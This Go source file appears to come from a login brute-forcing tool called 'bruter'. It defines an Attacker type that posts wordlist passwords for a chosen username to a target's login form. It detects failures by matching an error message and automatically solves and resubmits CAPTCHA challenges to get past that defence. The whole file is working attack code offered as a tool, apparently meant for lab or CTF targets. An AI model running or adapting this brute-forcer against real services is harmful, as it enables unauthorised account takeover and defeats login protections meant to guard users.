package attacker

import (
	"bruter/shared"
	"bruter/structs"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/thomas-osgood/OGOR/misc/generators"
	"github.com/thomas-osgood/OGOR/output"
)

// function designed to create and initialize a new
// Attacker object that can be used to brute-force login creds.
func NewAttacker(opts ...AttackerOptFunc) (attacker *Attacker, err error) {
	var currentOpt AttackerOptFunc
	var defaults AttackerOpt = AttackerOpt{
		Client:   http.DefaultClient,
		FailMsg:  "<strong>Error:</strong> Invalid password for user",
		Route:    "login",
		Scheme:   "http",
		TargetIP: "127.0.0.1",
		Wordlist: "usernames.txt",
	}

	defaults.Client.Timeout = 10 * time.Second

	for _, currentOpt = range opts {
		err = currentOpt(&defaults)
		if err != nil {
			return nil, err
		}
	}

	attacker = &Attacker{}
	attacker.client = defaults.Client
	attacker.commschan = make(chan string)
	attacker.failmsg = defaults.FailMsg
	attacker.Route = defaults.Route
	attacker.Scheme = defaults.Scheme
	attacker.TargetIP = defaults.TargetIP
	attacker.Username = defaults.Username
	attacker.Wordlist = defaults.Wordlist

	attacker.printer, err = output.NewOutputter()
	if err != nil {
		return nil, err
	}

	return attacker, nil
}

// function designed to set the HTTP client used by
// the attacker while making requests to the target.
func WithClient(client *http.Client) AttackerOptFunc {
	return func(a *AttackerOpt) error {
		if client == nil {
			return fmt.Errorf("client must not be nil")
		}

		a.Client = client

		return nil
	}
}

// function designed to set the fail message used
// by the attacker. this message will be used as
// an indication of an invalid password.
func WithFailMessage(msg string) AttackerOptFunc {
	return func(a *AttackerOpt) error {
		msg = strings.TrimSpace(msg)
		if len(msg) < 1 {
			return fmt.Errorf("fail message must be non-zero length string")
		}
		a.FailMsg = msg
		return nil
	}
}

// function designed to set the route targeted by
// the attacker during brute-force attempts.
func WithRoute(route string) AttackerOptFunc {
	return func(a *AttackerOpt) error {
		a.Route = route
		return nil
	}
}

// function designed to set the HTTP scheme used
// by the attacker during requests.
func WithScheme(scheme string) AttackerOptFunc {
	return func(a *AttackerOpt) error {
		scheme = strings.ToLower(scheme)

		if !shared.Contains(shared.ValidSchemes, scheme) {
			return fmt.Errorf("invalid scheme \"%s\"", scheme)
		}

		a.Scheme = scheme
		return nil
	}
}

// function designed to set the IP targeted by
// the attacker.
func WithTargetIP(ip string) AttackerOptFunc {
	return func(a *AttackerOpt) error {
		a.TargetIP = ip
		return nil
	}
}

// function designed to set the username used by
// the attacker during the brute-force attempts.
func WithUsername(username string) AttackerOptFunc {
	return func(a *AttackerOpt) error {
		username = strings.TrimSpace(username)
		if len(username) < 1 {
			return fmt.Errorf("username must be non-zero length string")
		}
		a.Username = username
		return nil
	}
}

// function designed to set the password wordlist
// used by the attacker.
func WithWordlist(wordlist string) AttackerOptFunc {
	return func(a *AttackerOpt) (err error) {
		if _, err = os.Stat(wordlist); err != nil {
			if errors.Is(err, os.ErrNotExist) {
				return fmt.Errorf("wordlist not found")
			} else {
				return err
			}
		}

		a.Wordlist = wordlist
		return nil
	}
}

// public function designed to carry out the brute-force
// against the target using the specified username and
// password wordlist.
func (a *Attacker) Attack() (creds *structs.LoginRequest, content []byte, err error) {
	var curpass string
	var passgen *generators.WordlistGenerator

	passgen, err = generators.NewWordlistGenerator(a.Wordlist)
	if err != nil {
		return nil, nil, err
	}

	// setup the communications channel and start the wordlist
	// generator. this will feed passwords into the comms channel.
	passgen.CommsChan = a.commschan
	go passgen.ReadWordlist()

	// loop through all possible passwords in the wordlist
	// until one is found. if no passwords are found, the
	// loop will end and this function will reach the bottom-most
	// return statement and return an error. if a valid
	// credential is discovered, this function will return it.
	for curpass = range a.commschan {
		content, err = a.makeRequest(structs.LoginRequest{Username: a.Username, Password: curpass})
		if err == nil {
			return &structs.LoginRequest{Username: a.Username, Password: curpass}, content, nil
		}
	}

	a.printer.ErrMsg("no valid credentials discovered")

	return nil, nil, fmt.Errorf("no valid credentials discovered")
}

// private function designed to make a request to the target
// and check for a valid login.
func (a *Attacker) makeRequest(creds structs.LoginRequest) (content []byte, err error) {
	var payload url.Values = make(url.Values)
	var resp *http.Response
	var tgturl string = fmt.Sprintf("%s://%s/%s", a.Scheme, a.TargetIP, a.Route)

	a.printer.SysMsgNB(fmt.Sprintf("attempting \"%s:%s\"", a.Username, creds.Password))

	payload.Set("username", creds.Username)
	payload.Set("password", creds.Password)

	if creds.Captcha != 0 {
		payload.Set("captcha", fmt.Sprintf("%d", creds.Captcha))
	}

	resp, err = a.client.PostForm(tgturl, payload)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	content, err = shared.CheckResponse(resp, a.failmsg, shared.CAPTCHAMSG)
	if err != nil {
		if creds.Captcha != 0 {
			return nil, err
		}

		creds.Captcha, err = shared.SolveCaptcha(content)
		if err != nil {
			return nil, err
		}

		return a.makeRequest(creds)
	}

	a.printer.SucMsg(fmt.Sprintf("credential found: \"%s:%s\"", a.Username, creds.Password))
	return content, nil
}
